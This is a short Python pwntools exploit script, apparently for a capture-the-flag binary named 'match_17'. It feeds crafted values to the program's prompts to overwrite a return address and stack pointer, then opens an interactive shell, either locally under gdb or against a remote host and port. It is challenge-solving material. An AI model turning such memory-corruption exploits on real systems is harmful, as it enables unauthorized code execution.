#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']
context.log_level = 'debug'
gdb_bool = True
#gdb_bool = False

win_addr = 0x4008CE

def x(data):
    r.sendlineafter("x: ",str(data))

def y(data):
    r.sendlineafter("y: ",str(data))

def z(data):
    r.sendlineafter("z: ",str(data))

def exploit(r):
    x(0x601251)
    y(0)
    z(0x4)
    x(0)
    y(0)
    a = p64(0x400a53) #ret addr
    b = p64(0x601251) #rsp
    cc = p64(0x400a53)
    z("0"+"AAAAAAAA"+str(a))
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./match_17"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x4009e2",
            "b *0x400975",
            "b *0x40097C",
            "b *0x400983",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
            #r =gdb.debug(binary_name, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

